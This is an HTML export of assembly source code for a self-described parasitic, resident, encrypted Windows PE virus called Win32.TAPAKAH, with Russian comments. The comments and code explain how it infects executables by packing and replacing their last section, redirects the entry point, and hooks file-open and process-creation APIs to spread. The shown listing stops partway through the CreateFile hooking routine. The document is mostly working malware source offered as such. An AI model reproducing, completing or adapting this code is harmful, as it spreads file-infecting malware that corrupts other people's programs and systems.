<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;@goto -)</span><span class="sc0">
</span><span class="sc1">; ============================ Win32.TAPAKAH ===========================</span><span class="sc0">
</span><span class="sc1">; Program       : TAPAKAH v1.0</span><span class="sc0">
</span><span class="sc1">; Description   : Parasitic,TSR,crypt PE virus</span><span class="sc0">
</span><span class="sc1">; Last modified : 09.04.2001</span><span class="sc0">
</span><span class="sc1">; Target OS     : Win95/98/NT</span><span class="sc0">
</span><span class="sc1">; Notes         :</span><span class="sc0">
</span><span class="sc1">; Метод заражения.</span><span class="sc0">
</span><span class="sc1">; Находим последнею секцию жертвы. Запаковываем ее. Вместо ее записываем</span><span class="sc0">
</span><span class="sc1">; свой код. В конец жертвы дописываем запакованную секцию оригинала. Меняем</span><span class="sc0">
</span><span class="sc1">; точку входа на свой код.</span><span class="sc0">
</span><span class="sc1">; Метод распространения.</span><span class="sc0">
</span><span class="sc1">; После получения управления, код заталкивается в стек и там запускается. Это</span><span class="sc0">
</span><span class="sc1">; обстоятельство позволяет отказаться  от атрибутов RW последней секции. Далее</span><span class="sc0">
</span><span class="sc1">; мы распаковываем секцию оригинала и возвращаем ее на место. После этого </span><span class="sc0">
</span><span class="sc1">; перехватываем CreateFileW - в случае NT и CreateFileA, CreateProcess,</span><span class="sc0">
</span><span class="sc1">; GetProcAddress в случае 9х. После чего отдаем управление жертве.</span><span class="sc0">
</span><span class="sc1">; CreateFileW перехватывается перезаписыванием первых 5-и байт на инструкцию</span><span class="sc0">
</span><span class="sc1">; call NewCreateFileW. Для этого предварительно устанавливается права записи</span><span class="sc0">
</span><span class="sc1">; на CreateFileW.</span><span class="sc0">
</span><span class="sc1">; CreateFileA, CreateProcess, GetProcAddress перехватывается подменой адресов</span><span class="sc0">
</span><span class="sc1">; в таблице импортов. MD9x не позволяет открывать на запись память в которой</span><span class="sc0">
</span><span class="sc1">; находится kernell32.dll.</span><span class="sc0">
</span><span class="sc1">; Заражение происходит при открытии файла или создании процесса.</span><span class="sc0">
</span><span class="sc1">; Явной деструктивной функции не содержит ;-) хватает неявных. </span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">wvoodoo.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">object.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">macro.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">exeption.inc</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'qwerty.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFW</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SysTime</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">.data?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">BADYSIZE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndBegin</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
</span><span class="sc5">DataBuffetSize</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1024h</span><span class="sc0">
</span><span class="sc5">BeginC</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BADYSIZE</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Kern32VxInit</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">     </span><span class="sc1">; Патчим  FileName</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Patch_File_by_Name</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Delta1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Entrypoint1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">Begin</span><span class="sc0">
</span><span class="sc5">Delta2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Contin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
        </span><span class="sc5">nextopc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;---------------------------</span><span class="sc0">
        </span><span class="sc1">; Инициализируем KERNEL32VX</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitKernel32dll</span><span class="sc0">
        </span><span class="sc1">;---------------------------</span><span class="sc0">
        </span><span class="sc1">; Выделяем память для данных и кода</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BADYSIZE</span><span class="sc4">+</span><span class="sc5">DataBuffetSize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; сохраним его для пересылки</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; edi= начало выделенной памяти</span><span class="sc0">
        </span><span class="sc1">;---------------------------</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Entrypoint1</span><span class="sc0">
</span><span class="sc5">Entrypoint1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc5">sub_esi</span><span class="sc0"> </span><span class="sc5">Delta1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Вспомним сколько надо переслать</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DataBuffetSize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; сохраним начало выделенной памяти</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">    </span><span class="sc1">; пересылка</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Lastcmd</span><span class="sc0">  </span><span class="sc1">; переход в конец кода на call @qr</span><span class="sc0">
       </span><span class="sc5">@qr</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; eax= смещение на конец кода</span><span class="sc0">
          </span><span class="sc1">;--------------------------------</span><span class="sc0">
          </span><span class="sc1">; Востановим SEH</span><span class="sc0">
          </span><span class="sc1">; ret old seh</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc1">;-----------  --------------------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Ret Old Stack</span><span class="sc0">
                         </span><span class="sc1">; Стек на конец кода</span><span class="sc0">

          </span><span class="sc5">add_edi</span><span class="sc0"> </span><span class="sc5">Delta2</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; В стек точку входа на команду в выделенной</span><span class="sc0">
                         </span><span class="sc1">; памяти.</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">           </span><span class="sc1">; Востановление регистров</span><span class="sc0">
                         </span><span class="sc1">; наследие DINA v2.2 - v2.3</span><span class="sc0">
                         </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; -----------------------\
                         ;                         |</span><span class="sc0">
                         </span><span class="sc1">;                         |</span><span class="sc0">
</span><span class="sc5">Contin</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc0">        </span><span class="sc1">; mov edi,XXXXXXXXh     &lt;-|</span><span class="sc0">
</span><span class="sc5">OldRVAEntrypoint</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0eaeaebebh</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">; сохраним точку входа в носитель</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc1">;Найдем PE  жертвы</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0ffff0000h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc4">-</span><span class="sc2">1234h</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
          </span><span class="sc5">@@FMz</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
          </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">EDIIMBASE</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@FMz</span><span class="sc0">
</span><span class="sc5">EDIIMBASE</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Proc1</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                </span><span class="sc1">; edi=object table</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; edi=Last Oject entry</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; ebx=RVA+IMBase of Last Oject</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
           </span><span class="sc1">;------------------------------------------------</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitKernel32dll</span><span class="sc0"> </span><span class="sc1">; Инициализируем KERNEL32VX</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc1">; Получим имя жертвы</span><span class="sc0">
           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc5">je_</span><span class="sc0">   </span><span class="sc5">NT</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">  </span><span class="sc1">; на случай если ':' отсутствуют</span><span class="sc0">
           </span><span class="sc5">jne_</span><span class="sc0">  </span><span class="sc5">NT</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc5">NT</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc1">;---</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">FindBS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cld</span><span class="sc0">                </span><span class="sc1">; Найдем пробел в конце командной строки</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">FindBSL1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">FindBS</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FindBSL1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; offset CommandLine</span><span class="sc0">
           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc1">; Откроем  жертву для дочитывания </span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0">                  </span><span class="sc1">;sub esp,SizeLockBuf</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SizeLockBuf</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc1">;mov [ebp+@FileHandler],eax  ; save handle</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">@FileHandler</span><span class="sc0">

           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">

           </span><span class="sc1">;mov [ebp+FileSize],eax        ; save filesize</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PAGE_READONLY</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReMapFile</span><span class="sc0">

           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Next4</span><span class="sc0">
</span><span class="sc5">Delat3</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SizeofLastObject</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next4</span><span class="sc0">
</span><span class="sc5">Next4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Delat3</span><span class="sc0">

           </span><span class="sc1">;mov esi,[ebp+Pointer2MapFile]</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">Pointer2MapFile</span><span class="sc0">

           </span><span class="sc1">;add esi,[ebp+FileSize]</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; esi=LpPackedLastObject</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Установим атрибут RW на</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; секцию в которой мы обитаем</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRW</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;  Распакуем иходные байты</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unpack</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseMapFile</span><span class="sc0">

           </span><span class="sc1">;push dword ptr [ebp+@FileHandler]</span><span class="sc0">

           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">@FileHandler</span><span class="sc0">

           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

           </span><span class="sc1">;add esp,SizeLockBuf</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SizeLockBuf</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Перехватим  CreateFile</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01bh</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">WINCS</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Wel'</span><span class="sc0">  </span><span class="sc1">; NT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'iFet'</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'aerC'</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">; Lp 2 str "CreateFileX",0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PatchKernel32DLLA_L2</span><span class="sc0">
                </span><span class="sc5">PatchKernel32DLLA_L2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKernelHahdler</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PatchKernel32DLLA_L2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LL1</span><span class="sc0">
                </span><span class="sc5">LL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndBegin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LL1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
